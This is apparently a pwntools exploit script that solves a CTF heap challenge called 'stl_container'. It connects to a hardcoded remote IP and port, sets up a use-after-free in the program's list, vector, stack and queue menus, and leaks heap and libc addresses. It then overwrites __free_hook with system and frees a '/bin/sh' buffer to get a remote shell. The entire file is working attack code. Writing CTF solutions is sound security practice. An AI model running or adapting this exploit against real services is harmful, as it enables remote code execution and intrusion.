from pwn import *

#context.log_level="debug"
#s=process("./stl_container")
s=remote("134.175.239.26", 8848)

def addStack(data):
	s.sendlineafter(">> ",str(4))
	s.sendlineafter(">> ",str(1))
	s.sendlineafter("input data:",str(data))

def delStack():
	s.sendlineafter(">> ",str(4))
	s.sendlineafter(">> ",str(2))

def addQueue(data):
	s.sendlineafter(">> ",str(3))
	s.sendlineafter(">> ",str(1))
	s.sendlineafter("input data:",str(data))

def delQueue():
	s.sendlineafter(">> ",str(3))
	s.sendlineafter(">> ",str(2))

def addList(data):
	s.sendlineafter(">> ",str(1))
	s.sendlineafter(">> ",str(1))
	s.sendlineafter("input data:",str(data))

def delList(idx):
	s.sendlineafter(">> ",str(1))
	s.sendlineafter(">> ",str(2))
	s.sendlineafter("index?\n",str(idx))

def addVector(data):
	s.sendlineafter(">> ",str(2))
	s.sendlineafter(">> ",str(1))
	s.sendlineafter("input data:",data)

def delVector(idx):
	s.sendlineafter(">> ",str(2))
	s.sendlineafter(">> ",str(2))
	s.sendlineafter("index?\n",str(idx))


def delVector(idx):
	s.sendlineafter(">> ",str(2))
	s.sendlineafter(">> ",str(2))
	s.sendlineafter("index?\n",str(idx))

def showVector(idx):
	s.sendlineafter(">> ",str(2))
	s.sendlineafter(">> ",str(3))
	s.sendlineafter("index?\n",str(idx))

def showList(idx):
	s.sendlineafter(">> ",str(1))
	s.sendlineafter(">> ",str(3))
	s.sendlineafter("index?\n",str(idx))

addVector("")
addVector("")
addStack("")
addStack("")
addQueue("")
addQueue("")
addList("")
addList("")

delList(1)
delList(0)
delStack()
delStack()
delQueue()
delVector(1)
delVector(0)
delQueue()

addList("")
showList(0)
s.recvuntil("data: ")
heap = u64(s.recv(6)+"\x00\x00")-0x1270a
log.info("heap = " + hex(heap))

addVector("")
addVector("")

delVector(0)
delVector(0)

addQueue(p64(heap+0x12430))
addQueue(p64(heap+0x11e70)*2 + p64(heap+0x12550))
showList(0)
s.recvuntil("data: ")
base = u64(s.recv(6)+"\x00\x00")-0x3ebca0
log.info("base = " + hex(base))
free_hook = base + 4118760
system = base + 324672

addStack(p64(free_hook))
addStack(p64(free_hook))
addVector("/bin/sh\x00")
#gdb.attach(s,'b*0x000555555555429\nb system')
addVector(p64(system))
s.interactive()
